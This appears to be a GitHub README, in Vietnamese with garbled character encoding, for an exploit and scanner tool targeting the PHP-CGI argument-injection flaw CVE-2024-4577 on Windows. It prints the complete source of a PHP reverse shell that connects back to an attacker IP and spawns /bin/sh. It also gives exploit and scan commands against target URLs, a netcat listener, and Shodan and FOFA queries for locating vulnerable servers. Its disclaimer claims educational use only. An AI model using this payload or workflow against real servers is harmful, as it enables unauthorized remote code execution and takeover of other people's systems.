<h1 align="center">
  PHP CVE-2024-4577-RCE-ATTACK-ATTACK 
</h2>

<p align="center">
    <a href="https://medium.com/@debugs">
        <img src="https://img.shields.io/badge/Medium-12100E?style=for-the-badge&logo=medium&logoColor=white" alt="Medium">
    </a>
    <a href="https://www.python.org/">
    <img src="https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54" alt="Python">
    </a>
    <a href="https://www.kali.org/">
    <img src="https://img.shields.io/badge/Kali-268BEE?style=for-the-badge&logo=kalilinux&logoColor=white" alt="Kali">      
    </a>
</p>

## üìú Description 

Trong c√°c phi√™n b·∫£n PHP 8.1.*tr∆∞·ªõc 8.1.29, 8.2.*tr∆∞·ªõc 8.2.20, 8.3.*tr∆∞·ªõc 8.3.8, khi s·ª≠ d·ª•ng Apache v√† PHP-CGI tr√™n Windows, n·∫øu h·ªá th·ªëng ƒë∆∞·ª£c thi·∫øt l·∫≠p ƒë·ªÉ s·ª≠ d·ª•ng m·ªôt s·ªë trang m√£ nh·∫•t ƒë·ªãnh, Windows c√≥ th·ªÉ s·ª≠ d·ª•ng h√†nh vi " Ph√π h·ª£p nh·∫•t " ƒë·ªÉ thay th·∫ø c√°c k√Ω t·ª± trong d√≤ng l·ªánh ƒë∆∞·ª£c cung c·∫•p cho c√°c h√†m API Win32. M√¥-ƒëun PHP CGI c√≥ th·ªÉ hi·ªÉu sai c√°c k√Ω t·ª± ƒë√≥ th√†nh c√°c t√πy ch·ªçn PHP, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p ng∆∞·ªùi d√πng ƒë·ªôc h·∫°i chuy·ªÉn c√°c t√πy ch·ªçn sang t·ªáp nh·ªã ph√¢n PHP ƒëang ch·∫°y v√† do ƒë√≥ ti·∫øt l·ªô m√£ ngu·ªìn c·ªßa t·∫≠p l·ªánh, ch·∫°y m√£ PHP t√πy √Ω tr√™n m√°y ch·ªß, v.v.

"XAMPP d·ªÖ b·ªã t·ªïn th∆∞∆°ng trong c·∫•u h√¨nh m·∫∑c ƒë·ªãnh v√† ch√∫ng t√¥i c√≥ th·ªÉ nh·∫Øm m·ª•c ti√™u ƒëi·ªÉm cu·ªëi /php-cgi/php-cgi.exe. ƒê·ªÉ nh·∫Øm m·ª•c ti√™u
m·ªôt ƒëi·ªÉm cu·ªëi .php r√µ r√†ng (v√≠ d·ª•: /index.php), m√°y ch·ªß ph·∫£i ƒë∆∞·ª£c c·∫•u h√¨nh ƒë·ªÉ ch·∫°y c√°c t·∫≠p l·ªánh PHP ·ªü ch·∫ø ƒë·ªô CGI."

## üìö Table of Contents
- üìú [Description](#-description)
- üõ†Ô∏è [Installation](#-installation)
- ‚öôÔ∏è [Usage](#-usage)
- üíÅ [References](#-references)
  
## üõ†Ô∏è Installation 
```bash
$ git clone https://github.com/debugs/CVE-2024-4577-RCE-ATTACK.git
$ cd CVE-2024-4577-RCE-ATTACK && pip install -r requirements.txt 
```
## ‚öôÔ∏è Usage
![php-cge](/Screenshot.png)
## ü§ñ Thi·∫øt l·∫≠p shell ƒë·∫£o ng∆∞·ª£c

### PHP Payload
> [!NOTE]
> C√¥ng c·ª• n√†y th·ªÉ hi·ªán c√°c k·ªπ thu·∫≠t v√† t·∫•n c√¥ng th·ª±c t·∫ø (TTP). Tuy nhi√™n m·∫´u t·∫£i tr·ªçng c·ª• th·ªÉ n√†y kh√¥ng ho·∫°t ƒë·ªông trong tr∆∞·ªùng h·ª£p n√†y. S·ª≠a ƒë·ªïi shell.php ƒë·ªÉ c√≥ ƒë∆∞·ª£c t·∫£i tr·ªçng ƒë·∫ßy ƒë·ªß ch·ª©c nƒÉng.
```php
# rev_shell.php
<?php
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = 'xxxxxxxxxxx';  // CHANGE THIS
$port = 9999;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
 ```
## üñ•Ô∏è Scanning server
```bash
$ python3 CVE-2024-4577.py -s -t https://target.com/  
                                                   
,------. ,--.  ,--.,------.   ,-----.,--.   ,--.,------.        ,---.   ,--.  ,---.   ,---.         ,---.,-----.,-----.,-----. ,------.  ,-----.,------. 
|  .--. '|  '--'  ||  .--. ' '  .--./ \  `.'  / |  .---',-----.'.-.  \ /    '.-.  \ /    |,-----. /    ||  .--''--,  /'--,  / |  .--. ''  .--./|  .---' 
|  '--' ||  .--.  ||  '--' | |  |      \     /  |  `--, '-----' .-' .'|  ()  |.-' .'/  '  |'-----'/  '  |'--. `\ .'  /  .'  /  |  '--'.'|  |    |  `--,  
|  | --' |  |  |  ||  | --'  '  '--'\   \   /   |  `---.       /   '-. \    //   '-.'--|  |       '--|  |.--'  //   /  /   /   |  |\  \ '  '--'\|  `---. 
`--'     `--'  `--'`--'       `-----'    `-'    `------'       '-----'  `--' '-----'   `--'          `--'`----' `--'   `--'    `--' '--' `-----'`------'             
         Author: Demongod | CVE-2024-4577 | PoC and Scanner |                     
    
[+] Target https://xxxx.com d·ªÖ b·ªã t·∫•n c√¥ng b·ªüi CVE-2024-4577
```

## üéØ Khai th√°c m√°y ch·ªß d·ªÖ b·ªã t·ªïn th∆∞∆°ng
```bash
$ python3 CVE-2024-4577.py -t http://example.com -e -p rev_shell.php
                                                   
,------. ,--.  ,--.,------.   ,-----.,--.   ,--.,------.        ,---.   ,--.  ,---.   ,---.         ,---.,-----.,-----.,-----. ,------.  ,-----.,------. 
|  .--. '|  '--'  ||  .--. ' '  .--./ \  `.'  / |  .---',-----.'.-.  \ /    '.-.  \ /    |,-----. /    ||  .--''--,  /'--,  / |  .--. ''  .--./|  .---' 
|  '--' ||  .--.  ||  '--' | |  |      \     /  |  `--, '-----' .-' .'|  ()  |.-' .'/  '  |'-----'/  '  |'--. `\ .'  /  .'  /  |  '--'.'|  |    |  `--,  
|  | --' |  |  |  ||  | --'  '  '--'\   \   /   |  `---.       /   '-. \    //   '-.'--|  |       '--|  |.--'  //   /  /   /   |  |\  \ '  '--'\|  `---. 
`--'     `--'  `--'`--'       `-----'    `-'    `------'       '-----'  `--' '-----'   `--'          `--'`----' `--'   `--'    `--' '--' `-----'`------'  
        Author: Demongod | CVE-2024-4577 | PoC and Scanner |

[+] Khai th√°c th√†nh c√¥ng!
```

## üë®üèª‚Äçüíª Netcat Listener
```bash
$ nc -lvnp 9999
```

## üîç Ph√°t hi·ªán m√°y ch·ªß d·ªÖ b·ªã t·∫•n c√¥ng
- **Shodan**: `server: PHP 8.1`, `server: PHP 8.2`, `server: PHP 8.3`
- **FOFA**: `protocol="http" && header="X-Powered-By: PHP/8.1" || header="X-Powered-By: PHP/8.2" || header="X-Powered-By: PHP/8.3"`
## üíÅ Gi·ªõi thi·ªáu
- https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577
- https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/http/cves/2024/CVE-2024-4577.yaml
- http://www.openwall.com/lists/oss-security/2024/06/07/1
- https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/windows/http/php_cgi_arg_injection_rce_cve_2024_4577.rb
- https://www.php.net/ChangeLog-8.php#8.1.29
- https://www.php.net/ChangeLog-8.php#8.2.20
- https://www.php.net/ChangeLog-8.php#8.3.8

## ‚ö†Ô∏è Tuy√™n b·ªë mi·ªÖn tr·ª´ tr√°ch nhi·ªám 
C√¥ng c·ª• n√†y ch·ªâ ƒë∆∞·ª£c cung c·∫•p cho m·ª•c ƒë√≠ch gi√°o d·ª•c v√† nghi√™n c·ª©u. Ng∆∞·ªùi s√°ng t·∫°o kh√¥ng ch·ªãu tr√°ch nhi·ªám v·ªÅ b·∫•t k·ª≥ vi·ªác s·ª≠ d·ª•ng sai ho·∫∑c thi·ªát h·∫°i n√†o do c√¥ng c·ª• n√†y g√¢y ra. [T·∫°o v·∫•n ƒë·ªÅ](https://github.com/debugs/CVE-2024-4577-RCE-ATTACK/issues)
